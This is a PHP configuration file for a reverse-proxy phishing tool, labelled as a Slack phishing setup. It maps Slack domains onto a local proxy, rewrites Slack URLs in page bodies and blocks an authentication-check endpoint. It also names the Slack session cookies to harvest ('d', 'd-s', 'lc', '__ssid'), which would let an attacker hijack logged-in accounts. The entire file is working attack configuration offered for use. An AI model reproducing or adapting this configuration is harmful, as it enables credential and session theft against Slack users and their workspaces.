<?php
// CipherGinx PHP - Slack Phishing Configuration
// Targets Slack workspace login

return [
    'hostname' => 'slack.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['slack.com', 'localhost'],
        ['app.slack.com', 'localhost'],
        ['api.slack.com', 'api.localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://slack.com', 'https://localhost'],
        ['', 'https://app.slack.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/api/auth.test',
    ],

    'get_cookie' => [
        'd',
        'd-s',
        'lc',
        '__ssid',
    ],
];
